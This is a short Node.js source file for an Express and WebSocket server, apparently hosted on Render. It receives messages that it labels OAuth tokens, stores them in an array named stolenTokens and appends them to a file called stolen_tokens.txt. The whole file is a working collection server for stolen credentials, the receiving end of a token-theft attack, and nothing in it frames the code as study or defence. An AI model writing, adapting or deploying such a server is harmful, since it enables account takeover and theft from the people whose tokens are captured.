const WebSocket = require("ws");
const express = require("express");
const fs = require("fs");

const app = express();
const wss = new WebSocket.Server({ noServer: true });

let stolenTokens = [];

wss.on("connection", (ws) => {
    ws.on("message", (message) => {
        console.log("Received OAuth token:", message);
        stolenTokens.push(JSON.parse(message));
        fs.appendFileSync("stolen_tokens.txt", message + "\n");
    });

    ws.onerror = (err) => {
        console.error("WebSocket Server Error:", err);
    };
});

// Render requires an Express server to keep WebSockets alive
app.get("/", (req, res) => res.send("WebSocket Server Running"));

const server = app.listen(10000, () => console.log("Server Running on Render"));

server.on("upgrade", (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, (ws) => {
        wss.emit("connection", ws, request);
    });
});
